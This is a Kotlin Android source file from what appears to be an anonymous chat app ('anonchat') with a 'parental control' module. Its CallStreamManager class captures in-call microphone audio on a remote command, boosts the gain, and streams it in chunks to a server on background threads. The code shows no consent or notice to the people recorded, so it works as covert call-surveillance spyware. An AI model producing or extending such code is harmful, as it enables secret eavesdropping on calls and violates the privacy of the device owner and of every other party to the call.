package com.anonchat.app.parentalcontrol.manager

import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.util.Log
import com.anonchat.app.parentalcontrol.api.ApiClient
import java.util.concurrent.LinkedBlockingQueue
import java.util.concurrent.TimeUnit

class CallStreamManager {

    private var recordThread: Thread? = null
    private var networkThread: Thread? = null

    @Volatile
    var isStreaming = false
        private set

    var onStreamingStateChanged: ((Boolean) -> Unit)? = null

    private var seqCounter = 0
    private val audioQueue = LinkedBlockingQueue<AudioChunkData>()

    private class AudioChunkData(
        val bytes: ByteArray,
        val seq: Int,
        val sampleRate: Int,
        val isDone: Boolean
    )

    fun startStreaming(commandId: String? = null) {
        if (isStreaming) return
        isStreaming = true
        seqCounter = 0
        audioQueue.clear()
        onStreamingStateChanged?.invoke(true)

        // 1. Dedicated network sender thread (prevents network latency from blocking AudioRecord)
        networkThread = Thread {
            Log.d(TAG, "Network sender thread started")
            while (isStreaming || !audioQueue.isEmpty()) {
                try {
                    val chunk = audioQueue.poll(500, TimeUnit.MILLISECONDS) ?: continue
                    sendAudioChunk(chunk.bytes, chunk.sampleRate, commandId, chunk.seq, chunk.isDone)
                    if (chunk.isDone) break
                } catch (e: InterruptedException) {
                    break
                } catch (e: Exception) {
                    Log.e(TAG, "Network send error: ${e.message}")
                }
            }
            Log.d(TAG, "Network sender thread finished")
        }.apply {
            isDaemon = true
            start()
        }

        // 2. High-priority recording thread (reads in-call audio with enhanced gain)
        recordThread = Thread {
            android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_URGENT_AUDIO)
            var recorder: AudioRecord? = null
            var actualSampleRate = 16000
            try {
                val channelConfig = AudioFormat.CHANNEL_IN_MONO
                val audioFormat = AudioFormat.ENCODING_PCM_16BIT

                var minBufSize = AudioRecord.getMinBufferSize(16000, channelConfig, audioFormat)
                if (minBufSize <= 0) {
                    actualSampleRate = 44100
                    minBufSize = AudioRecord.getMinBufferSize(44100, channelConfig, audioFormat)
                }

                val audioSources = listOf(
                    MediaRecorder.AudioSource.VOICE_COMMUNICATION,
                    MediaRecorder.AudioSource.VOICE_RECOGNITION,
                    MediaRecorder.AudioSource.MIC
                )

                for (source in audioSources) {
                    try {
                        val candidate = AudioRecord(
                            source,
                            actualSampleRate,
                            channelConfig,
                            audioFormat,
                            Math.max(minBufSize * 4, 16384)
                        )
                        if (candidate.state == AudioRecord.STATE_INITIALIZED) {
                            recorder = candidate
                            Log.d(TAG, "Initialized AudioRecord with source $source at ${actualSampleRate}Hz")
                            break
                        } else {
                            candidate.release()
                        }
                    } catch (e: Exception) {
                        Log.w(TAG, "AudioSource $source unavailable: ${e.message}")
                    }
                }

                if (recorder == null || recorder.state != AudioRecord.STATE_INITIALIZED) {
                    Log.e(TAG, "AudioRecord failed to initialize on all sources")
                    isStreaming = false
                    onStreamingStateChanged?.invoke(false)
                    return@Thread
                }

                recorder.startRecording()
                Log.d(TAG, "Started continuous call stream recording at ${actualSampleRate}Hz")

                // Read ~200ms of audio per chunk (16kHz: 6400 bytes; 44.1kHz: 17640 bytes)
                val chunkSize = if (actualSampleRate == 16000) 6400 else 17640
                val buffer = ByteArray(chunkSize)

                while (isStreaming && !Thread.currentThread().isInterrupted) {
                    val read = recorder.read(buffer, 0, buffer.size)
                    if (read > 0) {
                        val rawChunk = buffer.copyOfRange(0, read)
                        val boostedChunk = applyGainBoost(rawChunk, 2.5f)
                        seqCounter++
                        audioQueue.offer(AudioChunkData(boostedChunk, seqCounter, actualSampleRate, false))
                    }
                }

                // Send final 'done' signal chunk
                seqCounter++
                audioQueue.offer(AudioChunkData(ByteArray(0), seqCounter, actualSampleRate, true))

            } catch (e: SecurityException) {
                Log.e(TAG, "RECORD_AUDIO permission denied: ${e.message}")
            } catch (e: Exception) {
                Log.e(TAG, "Recording loop error: ${e.message}")
            } finally {
                try {
                    recorder?.stop()
                    recorder?.release()
                } catch (e: Exception) {}
                isStreaming = false
                onStreamingStateChanged?.invoke(false)
                Log.d(TAG, "Call recording loop stopped")
            }
        }.apply {
            isDaemon = true
            start()
        }
    }

    fun stopStreaming() {
        isStreaming = false
        recordThread?.interrupt()
        recordThread = null
        networkThread?.interrupt()
        networkThread = null
    }

    private fun sendAudioChunk(chunk: ByteArray, sampleRate: Int, commandId: String?, seq: Int, done: Boolean) {
        try {
            ApiClient.streamAudioChunk(chunk, sampleRate, commandId, seq, done)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send audio chunk: ${e.message}")
        }
    }

    private fun applyGainBoost(pcmBytes: ByteArray, multiplier: Float = 2.5f): ByteArray {
        val boosted = ByteArray(pcmBytes.size)
        for (i in 0 until pcmBytes.size - 1 step 2) {
            val low = pcmBytes[i].toInt() and 0xFF
            val high = pcmBytes[i + 1].toInt()
            val sample = (high shl 8) or low
            val amplified = (sample * multiplier).toInt()
            val clamped = when {
                amplified > 32767 -> 32767
                amplified < -32768 -> -32768
                else -> amplified
            }
            boosted[i] = (clamped and 0xFF).toByte()
            boosted[i + 1] = ((clamped shr 8) and 0xFF).toByte()
        }
        return boosted
    }

    companion object {
        private const val TAG = "CallStreamManager"
    }
}
